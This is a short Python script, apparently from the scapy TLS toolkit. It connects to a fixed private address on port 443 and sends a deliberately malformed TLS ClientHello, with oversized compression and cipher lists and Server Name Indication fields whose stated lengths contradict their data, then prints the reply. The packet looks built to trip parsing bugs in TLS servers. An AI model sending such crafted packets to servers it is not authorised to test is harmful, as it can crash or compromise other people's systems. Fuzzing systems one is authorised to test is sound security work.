#! /usr/bin/env python
# -*- coding: UTF-8 -*-
# Author : tintinweb@oststrom.com <github.com/tintinweb>


if __name__=="__main__":
    import scapy
    from scapy.layers.ssl_tls import *
    
    import socket
    
    
    target = ('10.17.71.241',443)
    
    # create tcp socket
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(target)
    
    # create TLS Handhsake / Client Hello packet
    p = TLSRecord(version='TLS_1_2')/ \
            TLSHandshake()/ \
                TLSClientHello(compression_methods= [TLSCompressionMethod.NULL,TLSCompressionMethod.DEFLATE]+range(255),
                               cipher_suites= [TLSCipherSuite.NULL_WITH_NULL_NULL]+range(0xff),
                               extensions=[
                                       TLSExtension()/ \
                                            TLSServerNameIndication(server_names= [TLSServerName(data="a"*500,length=16),
                                                                                   TLSServerName(length=222)]),
                                       TLSExtension()/ \
                                            TLSServerNameIndication(server_names=[TLSServerName(length=2)])
                                       ])
                
    p.show()

    
    print "sending TLS payload"
    s.sendall(str(p))
    resp = s.recv(1024)
    print "received, %s"%repr(resp)
    
    s.close()
    
    